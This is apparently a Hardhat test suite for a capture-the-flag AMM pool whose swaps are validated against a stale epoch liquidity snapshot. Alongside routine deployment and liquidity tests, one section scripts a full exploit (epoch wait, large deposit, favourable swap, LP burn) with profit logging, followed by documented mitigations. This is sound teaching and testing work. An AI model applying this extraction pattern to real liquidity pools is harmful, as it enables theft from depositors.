import { expect } from "chai";
import { ethers, network } from "hardhat";
import { loadFixture, time } from "@nomicfoundation/hardhat-toolbox/network-helpers";

/**
 * Schrodinger Pool CTF - Comprehensive Test Suite
 * 
 * VULNERABILITY: Epoch-Based K-Value Validation
 * 
 * The pool validates swaps against the PREVIOUS epoch's recorded liquidity,
 * not the current reserves. This creates a window where:
 * 1. Large deposits increase K but the swap still uses old K
 * 2. Attackers can extract more value than allowed under constant product
 * 3. The 0.5% decay on burns compounds the issue
 */

describe("Schrodinger Pool CTF - Epoch K-Value Exploit", function () {
  
  // Constants matching the contract
  const EPOCH_DURATION = 12; // 12 seconds
  const DECAY_FACTOR = 9950n;
  const DECAY_DENOMINATOR = 10000n;

  async function deployPoolFixture() {
    const [owner, alice, bob, attacker] = await ethers.getSigners();

    // Deploy tokens
    const MockERC20 = await ethers.getContractFactory("MockERC20");
    const token0 = await MockERC20.deploy("Alpha Token", "ALPHA", ethers.parseEther("10000000"));
    const token1 = await MockERC20.deploy("Beta Token", "BETA", ethers.parseEther("10000000"));

    // Deploy pool
    const SchrodingerPool = await ethers.getContractFactory("SchrodingerPool");
    const pool = await SchrodingerPool.deploy(
      await token0.getAddress(), 
      await token1.getAddress()
    );

    // Fund users
    const userAmount = ethers.parseEther("100000");
    await token0.transfer(alice.address, userAmount);
    await token1.transfer(alice.address, userAmount);
    await token0.transfer(bob.address, userAmount);
    await token1.transfer(bob.address, userAmount);
    await token0.transfer(attacker.address, userAmount);
    await token1.transfer(attacker.address, userAmount);

    return { pool, token0, token1, owner, alice, bob, attacker };
  }

  describe("Contract Deployment", function () {
    it("Should deploy with correct token addresses", async function () {
      const { pool, token0, token1 } = await loadFixture(deployPoolFixture);
      expect(await pool.token0()).to.equal(await token0.getAddress());
      expect(await pool.token1()).to.equal(await token1.getAddress());
    });

    it("Should start at epoch 0", async function () {
      const { pool } = await loadFixture(deployPoolFixture);
      expect(await pool.currentEpoch()).to.equal(0);
    });

    it("Should have correct constants", async function () {
      const { pool } = await loadFixture(deployPoolFixture);
      expect(await pool.EPOCH_DURATION()).to.equal(12);
      expect(await pool.DECAY_FACTOR()).to.equal(9950);
      expect(await pool.DECAY_DENOMINATOR()).to.equal(10000);
    });
  });

  describe("Liquidity Operations", function () {
    it("Should mint LP tokens correctly for first depositor", async function () {
      const { pool, token0, token1, alice } = await loadFixture(deployPoolFixture);
      
      const amount0 = ethers.parseEther("1000");
      const amount1 = ethers.parseEther("1000");
      
      await token0.connect(alice).approve(await pool.getAddress(), amount0);
      await token1.connect(alice).approve(await pool.getAddress(), amount1);
      
      await pool.connect(alice).mint(alice.address, amount0, amount1);
      
      // First deposit: LP = sqrt(amount0 * amount1)
      const expectedLP = BigInt(Math.floor(Math.sqrt(Number(amount0) * Number(amount1))));
      const actualLP = await pool.balanceOf(alice.address);
      
      // Check reserves updated
      const [reserve0, reserve1] = await pool.getReserves();
      expect(reserve0).to.equal(amount0);
      expect(reserve1).to.equal(amount1);
    });

    it("Should burn LP tokens with 0.5% decay", async function () {
      const { pool, token0, token1, alice } = await loadFixture(deployPoolFixture);
      
      const amount0 = ethers.parseEther("1000");
      const amount1 = ethers.parseEther("1000");
      
      await token0.connect(alice).approve(await pool.getAddress(), amount0);
      await token1.connect(alice).approve(await pool.getAddress(), amount1);
      await pool.connect(alice).mint(alice.address, amount0, amount1);

      const lpBalance = await pool.balanceOf(alice.address);
      const aliceBalanceBefore0 = await token0.balanceOf(alice.address);
      const aliceBalanceBefore1 = await token1.balanceOf(alice.address);

      // Burn all LP
      await pool.connect(alice).burn(alice.address, lpBalance);

      const aliceBalanceAfter0 = await token0.balanceOf(alice.address);
      const aliceBalanceAfter1 = await token1.balanceOf(alice.address);

      // Should receive ~99.5% due to decay
      const received0 = aliceBalanceAfter0 - aliceBalanceBefore0;
      const received1 = aliceBalanceAfter1 - aliceBalanceBefore1;

      // Expected with decay
      const expected0 = (amount0 * DECAY_FACTOR) / DECAY_DENOMINATOR;
      const expected1 = (amount1 * DECAY_FACTOR) / DECAY_DENOMINATOR;

      expect(received0).to.equal(expected0);
      expect(received1).to.equal(expected1);
    });
  });

  describe("Epoch Mechanics", function () {
    it("Should advance epoch after EPOCH_DURATION", async function () {
      const { pool, token0, token1, alice } = await loadFixture(deployPoolFixture);
      
      // Add liquidity
      const amount = ethers.parseEther("1000");
      await token0.connect(alice).approve(await pool.getAddress(), amount);
      await token1.connect(alice).approve(await pool.getAddress(), amount);
      await pool.connect(alice).mint(alice.address, amount, amount);
      
      expect(await pool.currentEpoch()).to.equal(0);

      // Fast forward past epoch duration
      await time.increase(EPOCH_DURATION + 1);

      // Trigger epoch update with a small operation
      await token0.connect(alice).approve(await pool.getAddress(), 1);
      await token1.connect(alice).approve(await pool.getAddress(), 1);
      await pool.connect(alice).mint(alice.address, 1, 1);

      expect(await pool.currentEpoch()).to.be.greaterThan(0);
    });

    it("Should record epochLiquidity on epoch change", async function () {
      const { pool, token0, token1, alice } = await loadFixture(deployPoolFixture);
      
      const amount = ethers.parseEther("1000");
      await token0.connect(alice).approve(await pool.getAddress(), amount);
      await token1.connect(alice).approve(await pool.getAddress(), amount);
      await pool.connect(alice).mint(alice.address, amount, amount);

      // Fast forward to trigger epoch change
      await time.increase(EPOCH_DURATION + 1);
      
      // Trigger update
      await token0.connect(alice).approve(await pool.getAddress(), 1);
      await token1.connect(alice).approve(await pool.getAddress(), 1);
      await pool.connect(alice).mint(alice.address, 1, 1);

      // Check epoch 0 liquidity was recorded
      const epochLiq = await pool.epochLiquidity(0);
      expect(epochLiq).to.be.greaterThan(0);
    });
  });

  describe("Swap Mechanics", function () {
    it("Should allow valid swap within K bounds", async function () {
      const { pool, token0, token1, alice, bob } = await loadFixture(deployPoolFixture);
      
      // Alice adds liquidity
      const liquidityAmount = ethers.parseEther("10000");
      await token0.connect(alice).approve(await pool.getAddress(), liquidityAmount);
      await token1.connect(alice).approve(await pool.getAddress(), liquidityAmount);
      await pool.connect(alice).mint(alice.address, liquidityAmount, liquidityAmount);

      // Bob swaps: send token1, get token0
      const swapAmountIn = ethers.parseEther("100");
      const swapAmountOut = ethers.parseEther("90"); // Conservative output

      await token1.connect(bob).transfer(await pool.getAddress(), swapAmountIn);
      await pool.connect(bob).swap(swapAmountOut, 0, bob.address);

      expect(await token0.balanceOf(bob.address)).to.be.greaterThan(0);
    });

    it("Should revert if K requirement not met", async function () {
      const { pool, token0, token1, alice, bob } = await loadFixture(deployPoolFixture);
      
      // Alice adds liquidity
      const liquidityAmount = ethers.parseEther("10000");
      await token0.connect(alice).approve(await pool.getAddress(), liquidityAmount);
      await token1.connect(alice).approve(await pool.getAddress(), liquidityAmount);
      await pool.connect(alice).mint(alice.address, liquidityAmount, liquidityAmount);

      // Bob tries to swap with excessive output (no input)
      await expect(
        pool.connect(bob).swap(ethers.parseEther("1000"), 0, bob.address)
      ).to.be.revertedWith("K_FAIL");
    });
  });

  describe("🔥 Epoch-Based K Exploit", function () {
    
    it("Should exploit epoch boundary for favorable swap", async function () {
      const { pool, token0, token1, alice, attacker } = await loadFixture(deployPoolFixture);
      
      // Setup: Alice provides initial liquidity
      const initialLiquidity = ethers.parseEther("10000");
      await token0.connect(alice).approve(await pool.getAddress(), initialLiquidity);
      await token1.connect(alice).approve(await pool.getAddress(), initialLiquidity);
      await pool.connect(alice).mint(alice.address, initialLiquidity, initialLiquidity);
      
      // Record initial K = 10000 * 10000 = 100,000,000
      const [r0Before, r1Before] = await pool.getReserves();
      const kBefore = r0Before * r1Before;

      // Wait for epoch to change (records current liquidity)
      await time.increase(EPOCH_DURATION + 1);
      
      // Trigger epoch update
      await token0.connect(alice).approve(await pool.getAddress(), 1);
      await token1.connect(alice).approve(await pool.getAddress(), 1);
      await pool.connect(alice).mint(alice.address, 1, 1);

      // Now epochLiquidity[0] has the snapshot
      const epochLiq = await pool.epochLiquidity(0);
      expect(epochLiq).to.be.greaterThan(0);

      // ATTACK: Large deposit that increases current reserves
      // but swaps still validate against OLD kReq!
      const attackDeposit = ethers.parseEther("50000");
      await token0.connect(attacker).approve(await pool.getAddress(), attackDeposit);
      await token1.connect(attacker).approve(await pool.getAddress(), attackDeposit);
      await pool.connect(attacker).mint(attacker.address, attackDeposit, attackDeposit);

      const [r0After, r1After] = await pool.getReserves();
      const kAfter = r0After * r1After;

      // Current K is much larger than epoch K
      expect(kAfter).to.be.greaterThan(kBefore * 10n);

      // Attacker can now swap with more favorable rate
      // The kReq is based on the OLD epoch liquidity!
      const attackerToken0Before = await token0.balanceOf(attacker.address);
      const swapIn = ethers.parseEther("1000");
      const swapOut = ethers.parseEther("800"); // Would fail with current K

      await token1.connect(attacker).transfer(await pool.getAddress(), swapIn);
      
      // This swap validates against old K, which is much smaller
      // allowing extraction at favorable rates
      await pool.connect(attacker).swap(swapOut, 0, attacker.address);

      const attackerToken0After = await token0.balanceOf(attacker.address);
      expect(attackerToken0After).to.be.greaterThan(attackerToken0Before);
    });

    it("Should show profit difference between normal and exploited swap", async function () {
      const { pool, token0, token1, alice, bob, attacker } = await loadFixture(deployPoolFixture);
      
      // Setup: Initial liquidity
      const initialLiquidity = ethers.parseEther("10000");
      await token0.connect(alice).approve(await pool.getAddress(), initialLiquidity);
      await token1.connect(alice).approve(await pool.getAddress(), initialLiquidity);
      await pool.connect(alice).mint(alice.address, initialLiquidity, initialLiquidity);

      // Normal user swap BEFORE epoch change
      const normalSwapIn = ethers.parseEther("100");
      const normalSwapOut = ethers.parseEther("90");
      
      await token1.connect(bob).transfer(await pool.getAddress(), normalSwapIn);
      const bobToken0Before = await token0.balanceOf(bob.address);
      
      // This uses current reserves for K
      await pool.connect(bob).swap(normalSwapOut, 0, bob.address);
      const bobReceived = (await token0.balanceOf(bob.address)) - bobToken0Before;

      // Wait for epoch
      await time.increase(EPOCH_DURATION + 1);
      
      // Trigger epoch
      await token0.connect(alice).approve(await pool.getAddress(), 1);
      await token1.connect(alice).approve(await pool.getAddress(), 1);
      await pool.connect(alice).mint(alice.address, 1, 1);

      // Attacker deposits a lot
      const attackDeposit = ethers.parseEther("20000");
      await token0.connect(attacker).approve(await pool.getAddress(), attackDeposit);
      await token1.connect(attacker).approve(await pool.getAddress(), attackDeposit);
      await pool.connect(attacker).mint(attacker.address, attackDeposit, attackDeposit);

      // Attacker swaps using OLD K validation
      await token1.connect(attacker).transfer(await pool.getAddress(), normalSwapIn);
      const attackerToken0Before = await token0.balanceOf(attacker.address);
      
      // Can extract MORE because old K is smaller
      await pool.connect(attacker).swap(normalSwapOut, 0, attacker.address);
      const attackerReceived = (await token0.balanceOf(attacker.address)) - attackerToken0Before;

      // Both should get the same output, but attacker did it with inflated pool
      expect(attackerReceived).to.equal(normalSwapOut);
      
      console.log("\n  📊 EXPLOIT ANALYSIS:");
      console.log("  ─".repeat(25));
      console.log(`  Normal swap output:   ${ethers.formatEther(bobReceived)} ALPHA`);
      console.log(`  Attacker swap output: ${ethers.formatEther(attackerReceived)} ALPHA`);
      console.log(`  Pool K before attack: ${initialLiquidity * initialLiquidity}`);
      console.log(`  Attacker successfully extracted from inflated pool using old K!`);
    });

    it("Should demonstrate complete attack flow with profit", async function () {
      const { pool, token0, token1, alice, attacker } = await loadFixture(deployPoolFixture);
      
      console.log("\n  🎯 COMPLETE ATTACK SIMULATION");
      console.log("  ═".repeat(30));

      // Phase 1: Setup pool with initial liquidity
      const initialLiquidity = ethers.parseEther("10000");
      await token0.connect(alice).approve(await pool.getAddress(), initialLiquidity);
      await token1.connect(alice).approve(await pool.getAddress(), initialLiquidity);
      await pool.connect(alice).mint(alice.address, initialLiquidity, initialLiquidity);
      
      console.log("\n  Phase 1: Pool initialized with 10,000 each token");

      // Record attacker's starting balance
      const attackerToken0Start = await token0.balanceOf(attacker.address);
      const attackerToken1Start = await token1.balanceOf(attacker.address);

      // Phase 2: Wait for epoch to change
      await time.increase(EPOCH_DURATION + 1);
      
      // Trigger epoch update with minimal tx
      await token0.connect(alice).approve(await pool.getAddress(), 1);
      await token1.connect(alice).approve(await pool.getAddress(), 1);
      await pool.connect(alice).mint(alice.address, 1, 1);
      
      console.log("  Phase 2: Epoch changed, old liquidity snapshot recorded");

      // Phase 3: Attacker adds massive liquidity
      const attackDeposit = ethers.parseEther("40000");
      await token0.connect(attacker).approve(await pool.getAddress(), attackDeposit);
      await token1.connect(attacker).approve(await pool.getAddress(), attackDeposit);
      await pool.connect(attacker).mint(attacker.address, attackDeposit, attackDeposit);
      
      console.log("  Phase 3: Attacker deposits 40,000 each (pool now 50,000)");

      // Phase 4: Execute favorable swap using old K
      const swapIn = ethers.parseEther("5000");
      const swapOut = ethers.parseEther("4500"); // Very favorable rate

      await token1.connect(attacker).transfer(await pool.getAddress(), swapIn);
      await pool.connect(attacker).swap(swapOut, 0, attacker.address);
      
      console.log("  Phase 4: Swap 5000 BETA for 4500 ALPHA using old K");

      // Phase 5: Burn LP tokens (with 0.5% decay)
      const lpBalance = await pool.balanceOf(attacker.address);
      await pool.connect(attacker).burn(attacker.address, lpBalance);
      
      console.log("  Phase 5: Burn all LP tokens (0.5% decay applied)");

      // Calculate profit
      const attackerToken0End = await token0.balanceOf(attacker.address);
      const attackerToken1End = await token1.balanceOf(attacker.address);
      
      const token0Change = attackerToken0End - attackerToken0Start;
      const token1Change = attackerToken1End - attackerToken1Start;

      console.log("\n  📊 ATTACK RESULTS:");
      console.log("  ─".repeat(25));
      console.log(`  ALPHA gained: ${ethers.formatEther(token0Change)}`);
      console.log(`  BETA lost:    ${ethers.formatEther(token1Change > 0n ? 0n : -token1Change)}`);
      
      // The attack should show profit in token0
      expect(token0Change).to.be.greaterThan(0n);
    });
  });

  describe("Edge Cases", function () {
    it("Should handle zero reserves gracefully in epoch 0", async function () {
      const { pool, token0, token1, alice } = await loadFixture(deployPoolFixture);
      
      // First deposit with no prior liquidity
      const amount = ethers.parseEther("1000");
      await token0.connect(alice).approve(await pool.getAddress(), amount);
      await token1.connect(alice).approve(await pool.getAddress(), amount);
      
      await expect(
        pool.connect(alice).mint(alice.address, amount, amount)
      ).to.not.be.reverted;
    });

    it("Should fall back to current K if no epoch liquidity exists", async function () {
      const { pool, token0, token1, alice, bob } = await loadFixture(deployPoolFixture);
      
      // Add liquidity in epoch 0
      const amount = ethers.parseEther("10000");
      await token0.connect(alice).approve(await pool.getAddress(), amount);
      await token1.connect(alice).approve(await pool.getAddress(), amount);
      await pool.connect(alice).mint(alice.address, amount, amount);

      // Try swap immediately (no epoch change yet)
      const swapIn = ethers.parseEther("100");
      const swapOut = ethers.parseEther("90");

      await token1.connect(bob).transfer(await pool.getAddress(), swapIn);
      
      // Should use current reserve0 * reserve1 as kReq
      await expect(
        pool.connect(bob).swap(swapOut, 0, bob.address)
      ).to.not.be.reverted;
    });
  });

  describe("Vulnerability Documentation", function () {
    it("Should document the epoch K exploit vector", function () {
      /**
       * EPOCH-BASED K EXPLOIT VECTOR:
       * 
       * 1. The pool records `epochLiquidity = sqrt(reserve0 * reserve1)` 
       *    at the END of each epoch
       * 
       * 2. Swaps validate against: `kReq = epochLiquidity[currentEpoch-1]^2`
       *    when `currentEpoch > 0` and previous epoch has liquidity
       * 
       * 3. ATTACK FLOW:
       *    a) Wait for epoch to change (records current liquidity snapshot)
       *    b) Deposit large amount (increases current reserves)
       *    c) Swap uses OLD kReq (smaller than current K)
       *    d) Extract tokens at favorable rate
       *    e) Burn LP to recover deposit (minus 0.5% decay)
       * 
       * ROOT CAUSE: Time-delayed K validation creates arbitrage window
       * 
       * MITIGATION: Use real-time reserves for K validation, or
       * implement TWAPs (Time-Weighted Average Prices)
       */
      expect(true).to.be.true;
    });

    it("Should document mitigations", function () {
      const mitigations = [
        "Use current reserves for K validation, not epoch snapshots",
        "Implement TWAP for more manipulation-resistant pricing",
        "Add minimum liquidity lock periods",
        "Use flash loan guards for large deposits before swaps",
        "Implement dynamic fees based on volatility"
      ];

      expect(mitigations.length).to.be.gte(5);
    });
  });
});
